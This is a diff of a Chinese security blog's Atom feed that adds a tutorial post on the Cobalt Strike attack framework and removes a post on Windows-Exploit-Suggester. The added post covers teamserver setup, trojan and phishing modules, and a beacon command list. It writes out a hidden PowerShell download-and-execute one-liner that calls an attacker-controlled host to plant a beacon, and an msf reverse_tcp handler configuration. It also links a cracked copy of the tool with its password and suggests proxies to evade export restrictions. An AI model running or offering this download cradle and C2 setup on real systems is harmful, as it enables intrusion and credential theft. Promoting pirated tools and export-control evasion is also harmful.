@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-10-25T15:28:41.188Z</updated>
+  <updated>2017-10-31T00:57:18.996Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,53 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Cobalt Strike学习笔记</title>
+    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2017/10/27/Cobalt-Strike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
+    <id>http://yoursite.com/渗透/2017/10/27/Cobalt-Strike学习笔记.html</id>
+    <published>2017-10-27T03:45:22.000Z</published>
+    <updated>2017-10-31T00:57:18.996Z</updated>
+    
+    <content type="html"><![CDATA[<p>　　Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。Cobalt Strike主要用于团队作战，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。<br>　　<a href="https://cobaltstrike.com/" target="_blank" rel="external">Cobalt Strike</a>，据说现在最新版为3.9，主要分为试用版和付费版，试用版为21天，付费版3500美元，据说网上也有一些<a href="http://www.cnblogs.com/haq5201314/p/7040832.html" target="_blank" rel="external">破解教程</a>，<a href="https://pan.baidu.com/s/1qYocNbm" target="_blank" rel="external">cobaltstrik3.6破解版下载</a> 密码: 51tg。因为Cobalt Strike是美国对外限制型出口软件，只在美国和加拿大允许发售，所以我们需要google搜索下usa的个人代理来绕开限制。<br><a id="more"></a></p>
+<h2 id="0x01-安装与运行"><a href="#0x01-安装与运行" class="headerlink" title="0x01 安装与运行"></a>0x01 安装与运行</h2><p>　　Cobalt Strike需要JAVA环境，需要注意的是JAVA环境不要安装最新版，否则会出一些问题，Cobalt Strike分为客户端和服务端可分布式操作可以协同作战。但一定要架设在外网上，或者自己想要搭建的环境中，服务器端只能运行在Linux系统上。其中关键的文件是teamserver以及cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./teamserver 192.168.3.32 test   #自己的IP和密码</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-10-27/38385816.jpg" alt=""><br>　　说一下我安装运行时遇到的坑，首先：JAVA版本必须为8，否则就因版本问题无法编译运行；二：IP必须为真实IP，不能使用0.0.0.0或者127.0.0.1，这样也会报错的。<br>　　服务器端运行之后，我们就可以运行客户端了，客户端可以在Windows或者Linux下都可以。输入我们刚才IP以及端口、密码，用户名可以任意设置。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-27/28532677.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-27/47388596.jpg" alt=""><br>　　当攻击目标在控制台所操作的指令都会被记录到保留在Cobalt Strike目录logs下，对了，破解版是无法更新的。</p>
+<h2 id="0x02-参数详情"><a href="#0x02-参数详情" class="headerlink" title="0x02 参数详情"></a>0x02 参数详情</h2><ul>
+<li><p>Cobalt Strike</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">New Connection  #进行另外一个连接，支持连接多个服务器端</div><div class="line">Preferences  #设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</div><div class="line">Visualization  #主要展示输出结果的形式</div><div class="line">VPN Interfaces  #设置VPN接口</div><div class="line">Listenrs  #创建一个Listener</div><div class="line">Script Manager  #</div><div class="line">Close  #退出连接</div></pre></td></tr></table></figure>
+</li>
+<li><p>View</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Applications  #显示受害者机器的应用信息</div><div class="line">Credentials  #凭证当通过hashdump或者Mimikatz抓取过的密码都会储存在这里。</div><div class="line">Downloads  #下载文件</div><div class="line">Event Log  #主机上线记录以及团队协作聊天记录</div><div class="line">Keystrokes  #键盘记录</div><div class="line">Proxy Pivots  #代理模块</div><div class="line">Screenshots  #进程截图</div><div class="line">Script Console  #控制台,在这里可以加载[各种脚本](https://github.com/rsmudge/cortana-scripts)以增强功能</div><div class="line">Targets  #显示目标</div><div class="line">Web Log  #Web访问记录</div></pre></td></tr></table></figure>
+</li>
+<li><p>Attacks</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">Packages  #攻击包</div><div class="line">  HTML Application   生成恶意的HTA木马文件</div><div class="line">  MS Office Macro   生成office宏病毒文件</div><div class="line">  Payload Generator   生成各种语言版本的payload</div><div class="line">  USB/CD AutoPlay   生成利用自动播放运行的木马文件</div><div class="line">  Windows Dropper   捆绑器，能够对文档类进行捆绑</div><div class="line">  Windows Executable   生成可执行exe木马</div><div class="line">  Windows Executable(S)  生成无状态的可执行exe木马</div><div class="line">Web Drive-by  #钓鱼攻击</div><div class="line">  Manage  对开启的web服务进行管理</div><div class="line">  Clone Site  克隆网站，可以记录受害者提交的数据</div><div class="line">  Host File  提供一个文件下载，可以修改Mime信息</div><div class="line">  PowerShell Web Delivery  类似于msf 的web_delivery </div><div class="line">  Signed Applet Attack  使用java自签名的程序进行钓鱼攻击</div><div class="line">  Smart Applet Attack  自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本</div><div class="line">  System Profiler  用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等</div><div class="line">Spear Phish  #用来邮件钓鱼的模块</div></pre></td></tr></table></figure>
+</li>
+<li><p>Reporting</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">activity report  #活动报告生成</div><div class="line">Hosts report  #主机报告</div><div class="line">Indicators opromisef com   #目标报告</div><div class="line">Sessions report  #会话报告</div><div class="line">Social engineering report  #社会工程报告</div><div class="line">Export data   #数据出口</div></pre></td></tr></table></figure>
+</li>
+<li><p>help</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Homepage  #官方主页</div><div class="line">Support  #技术支持</div><div class="line">Arsenal  #开发者</div><div class="line">System information  #版本信息</div><div class="line">About  #关于</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="0x03-基本运行"><a href="#0x03-基本运行" class="headerlink" title="0x03 基本运行"></a>0x03 基本运行</h2><p>　　首先使用Cobalt Strike需要创建一个Listener，点击 Cobalt Strike-&gt;Listeners ，然后点击Add便可以创建自己想要的Listeners了，Cobalt Strike3.6包括<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">windows/beacon_dns/reverse_dns_txt</div><div class="line">windows/beacon_dns/reverse_http</div><div class="line">windows/beacon_http/reverse_http</div><div class="line">windows/beacon_https/reverse_https</div><div class="line">windows/beacon_smb/bind_pipe</div><div class="line">windows/foreign/reverse_dns_txt</div><div class="line">windows/foreign/reverse_http</div><div class="line">windows/foreign/reverse_https</div><div class="line">windows/foreign/reverse_tcp</div></pre></td></tr></table></figure></p>
+<p>　　其中windows/beacon是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign为外部监听器，即msf或者Armitage的监听器。 选择监听器以后，host会自动填写我们开启服务时的ip，配置监听端口，然后保存，监听器就创建好了。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-27/29632476.jpg" alt=""><br>　　在创建好监听器，接下来就需要配置我们的客户端了，Cobalt Strike提供了多种包括攻击方式，在这里我们使用Powershell进行攻击。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-28/7581397.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-28/46855327.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.3.83:8888/a&apos;))&quot;</div></pre></td></tr></table></figure></p>
+<p>　　当我们在目标靶机运行上面这条Powershell之后，我们的Cobalt Strike客户端就会监听到我们的反弹链接，我们就可以看到已经有目标机上线。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-28/28125408.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">beacon&gt; help    </div><div class="line"></div><div class="line">Beacon Commands</div><div class="line">===============    </div><div class="line"></div><div class="line">    Command                   Description</div><div class="line">    -------                   -----------</div><div class="line">    browserpivot              Setup a browser pivot session </div><div class="line">    bypassuac                 Spawn a session in a high integrity process</div><div class="line">    cancel                    Cancel a download that&apos;s in-progress</div><div class="line">    cd                        Change directory</div><div class="line">    checkin                   Call home and post data</div><div class="line">    clear                     Clear beacon queue</div><div class="line">    covertvpn                 Deploy Covert VPN client</div><div class="line">    desktop                   View and interact with target&apos;s desktop</div><div class="line">    dllinject                 Inject a Reflective DLL into a process</div><div class="line">    download                  Download a file</div><div class="line">    downloads                 Lists file downloads in progress</div><div class="line">    drives                    List drives on target</div><div class="line">    elevate                   Try to elevate privileges</div><div class="line">    execute                   Execute a program on target</div><div class="line">    exit                      Terminate the beacon session</div><div class="line">    getsystem                 Attempt to get SYSTEM</div><div class="line">    getuid                    Get User ID</div><div class="line">    hashdump                  Dump password hashes</div><div class="line">    help                      Help menu</div><div class="line">    inject                    Spawn a session in a specific process</div><div class="line">    jobkill                   Kill a long-running post-exploitation task</div><div class="line">    jobs                      List long-running post-exploitation tasks</div><div class="line">    kerberos_ccache_use       Apply kerberos ticket from cache to this session</div><div class="line">    kerberos_ticket_purge     Purge kerberos tickets from this session</div><div class="line">    kerberos_ticket_use       Apply kerberos ticket to this session</div><div class="line">    keylogger                 Inject a keystroke logger into a process</div><div class="line">    kill                      Kill a process</div><div class="line">    link                      Connect to a Beacon peer over SMB</div><div class="line">    logonpasswords            Dump credentials and hashes with mimikatz</div><div class="line">    ls                        List files</div><div class="line">    make_token                Create a token to pass credentials</div><div class="line">    mimikatz                  Runs a mimikatz command</div><div class="line">    mkdir                     Make a directory</div><div class="line">    mode dns                  Use DNS A as data channel (DNS beacon only)</div><div class="line">    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)</div><div class="line">    mode http                 Use HTTP as data channel</div><div class="line">    mode smb                  Use SMB peer-to-peer communication</div><div class="line">    net                       Network and host enumeration tool</div><div class="line">    note                      Assign a note to this Beacon       </div><div class="line">    portscan                  Scan a network for open services</div><div class="line">    powershell                Execute a command via powershell</div><div class="line">    powershell-import         Import a powershell script</div><div class="line">    ps                        Show process list</div><div class="line">    psexec                    Use a service to spawn a session on a host</div><div class="line">    psexec_psh                Use PowerShell to spawn a session on a host</div><div class="line">    pth                       Pass-the-hash using Mimikatz</div><div class="line">    pwd                       Print current directory</div><div class="line">    rev2self                  Revert to original token</div><div class="line">    rm                        Remove a file or folder</div><div class="line">    rportfwd                  Setup a reverse port forward</div><div class="line">    runas                     Execute a program as another user</div><div class="line">    screenshot                Take a screenshot</div><div class="line">    shell                     Execute a command via cmd.exe</div><div class="line">    sleep                     Set beacon sleep time</div><div class="line">    socks                     Start SOCKS4a server to relay traffic</div><div class="line">    socks stop                Stop SOCKS4a server</div><div class="line">    spawn                     Spawn a session </div><div class="line">    spawnas                   Spawn a session as another user</div><div class="line">    spawnto                   Set executable to spawn processes into</div><div class="line">    steal_token               Steal access token from a process</div><div class="line">    timestomp                 Apply timestamps from one file to another</div><div class="line">    unlink                    Disconnect from parent Beacon</div><div class="line">    upload                    Upload a file</div><div class="line">    wdigest                   Dump plaintext credentials with mimikatz</div><div class="line">    winrm                     Use WinRM to spawn a session on a host</div><div class="line">    wmi                       Use WMI to spawn a session on a host</div></pre></td></tr></table></figure></p>
+<h2 id="0x04-与msf进行联动"><a href="#0x04-与msf进行联动" class="headerlink" title="0x04 与msf进行联动"></a>0x04 与msf进行联动</h2><p>　　在Cobalt strike3.0 之后不再使用Metasploit框架而作为一个独立的平台使用，但是我们还是可以做到与msf联动。 首先我们使用msf的reverse_tcp开启监听模式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set lhost 192.168.3.33 </div><div class="line">lhost =&gt; 192.168.3.33</div><div class="line">msf exploit(handler) &gt; set lport 5555</div><div class="line">lport =&gt; 5555</div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure></p>
+<p>　　之后使用Cobalt Strike创建一个windows/foreign/reverse_tcp Listener，其中ip为msf的ip地址，端口为msf所监听的端口，然后选中计算机，右键-&gt;Spawn:<br>选择刚刚创建的监听器：</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;　　Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。Cobalt Strike主要用于团队作战，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。&lt;br&gt;　　&lt;a href=&quot;https://cobaltstrike.com/&quot;&gt;Cobalt Strike&lt;/a&gt;，据说现在最新版为3.9，主要分为试用版和付费版，试用版为21天，付费版3500美元，据说网上也有一些&lt;a href=&quot;http://www.cnblogs.com/haq5201314/p/7040832.html&quot;&gt;破解教程&lt;/a&gt;，&lt;a href=&quot;https://pan.baidu.com/s/1qYocNbm&quot;&gt;cobaltstrik3.6破解版下载&lt;/a&gt; 密码: 51tg。因为Cobalt Strike是美国对外限制型出口软件，只在美国和加拿大允许发售，所以我们需要google搜索下usa的个人代理来绕开限制。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
   
   <entry>
     <title>Linux渗透之OpenSSH后门</title>
@@ -857,9 +904,9 @@
       <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
     
     
-      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
-    
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
     
   </entry>
   
@@ -1681,45 +1728,9 @@ print c
       <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
     
     
-      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
-    
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
-  </entry>
-  
-  <entry>
-    <title>Windows-Exploit-Suggester（Windows下提权辅助工具）</title>
-    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2017/02/27/Windows-Exploit-Suggester%EF%BC%88Windows%E4%B8%8B%E6%8F%90%E6%9D%83%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7%EF%BC%89.html"/>
-    <id>http://yoursite.com/渗透/2017/02/27/Windows-Exploit-Suggester（Windows下提权辅助工具）.html</id>
-    <published>2017-02-27T05:35:19.000Z</published>
-    <updated>2017-04-03T13:37:33.198Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>提权：</strong>顾名思义就是提高自己在服务器中的权限，就比如在windows中你本身登录的用户是guest，然后通过提权后就变成超级管理员，拥有了管理Windows的所有权限。提权是黑客的专业名词，一般用于网站入侵和系统入侵中。</p>
-<h3 id="0x01-Windows-Exploit-Suggester"><a href="#0x01-Windows-Exploit-Suggester" class="headerlink" title="0x01 Windows-Exploit-Suggester"></a>0x01 Windows-Exploit-Suggester</h3><p>该工具可以将目标系统的补丁安装情况与微软的漏洞数据库进行对比，进而检测出目标系统中潜在的未修复漏洞。同时此工具还会告知用户针对于此漏洞是否有公开的exp和可用的Metasploit模块。<br>同时它可以使用–update参数去自动化地从微软下载漏洞补丁数据库，并将其以Excel表格的形式保存。<br><a id="more"></a><br>需要注意的是，此工具首先会假定目标系统存在所有漏洞，然后再基于系统补丁情况去选择性的移除已修补漏洞。故此工具可能会造成一些误报，因此你首先需要了解目标机器安装了哪些软件。例如，如果此机器没有IIS的补丁，即使机器上没有IIS，工具也同样会认为存在此漏洞。</p>
-<p><img src="http://obh1qcqek.bkt.clouddn.com/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93.png" alt=""></p>
-<h3 id="0x02-下载安装"><a href="#0x02-下载安装" class="headerlink" title="0x02 下载安装"></a>0x02 下载安装</h3><p>下载<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="external">地址</a></p>
-<p>使用<strong>python windows-exploit-suggester.py –update</strong>对Windows-Exploit-Suggester的漏洞数据库进行更新，<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227093811561.jpg" alt=""><br>可以看到多了一个Excel文件，其中包含了常用的的最新的一些漏洞。<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227094655995.jpg" alt=""></p>
-<h3 id="0x03-安装程序依赖：python-xlrd"><a href="#0x03-安装程序依赖：python-xlrd" class="headerlink" title="0x03 安装程序依赖：python-xlrd"></a>0x03 安装程序依赖：python-xlrd</h3><p>更新好之后还需要安装 xlrd模块，用以读取Excel里面的漏洞内容。<br>安装可以使用pip，使用pip install xlrd直接安装<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227095526835.jpg" alt=""><br>或者<a href="https://pypi.python.org/pypi/xlrd/0.9.4" target="_blank" rel="external">下载</a>，执行./setup.py install对xlrd模块进行安装。</p>
-<p><img src="http://obh1qcqek.bkt.clouddn.com/125.png" alt=""></p>
-<h3 id="0x03-查看目标漏洞信息"><a href="#0x03-查看目标漏洞信息" class="headerlink" title="0x03 查看目标漏洞信息"></a>0x03 查看目标漏洞信息</h3><p>在目标机器中执行<strong>systeminfo</strong>，并保存为文本文件</p>
-<p><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227100917958.jpg" alt=""></p>
-<p>Windows-Exploit-Suggester中所有的文件和内容<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227101504916.jpg" alt=""></p>
-<p>执行<strong>python windows-exploit-suggester.py –database 2017-02-27-mssb.xls –systeminfo 12.txt</strong><br>参数<strong>–database</strong>，指定数据库位置(就是那个excel文件)，参数<strong>–systeminfo</strong>，指定目标信息的文件。<br><img src="http://obh1qcqek.bkt.clouddn.com/66666.jpg" alt=""><br>它会显示所有可能的漏洞的操作系统受害者Windows PC</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;strong&gt;提权：&lt;/strong&gt;顾名思义就是提高自己在服务器中的权限，就比如在windows中你本身登录的用户是guest，然后通过提权后就变成超级管理员，拥有了管理Windows的所有权限。提权是黑客的专业名词，一般用于网站入侵和系统入侵中。&lt;/p&gt;
-&lt;h3 id=&quot;0x01-Windows-Exploit-Suggester&quot;&gt;&lt;a href=&quot;#0x01-Windows-Exploit-Suggester&quot; class=&quot;headerlink&quot; title=&quot;0x01 Windows-Exploit-Suggester&quot;&gt;&lt;/a&gt;0x01 Windows-Exploit-Suggester&lt;/h3&gt;&lt;p&gt;该工具可以将目标系统的补丁安装情况与微软的漏洞数据库进行对比，进而检测出目标系统中潜在的未修复漏洞。同时此工具还会告知用户针对于此漏洞是否有公开的exp和可用的Metasploit模块。&lt;br&gt;同时它可以使用–update参数去自动化地从微软下载漏洞补丁数据库，并将其以Excel表格的形式保存。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
+      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
     
   </entry>
   
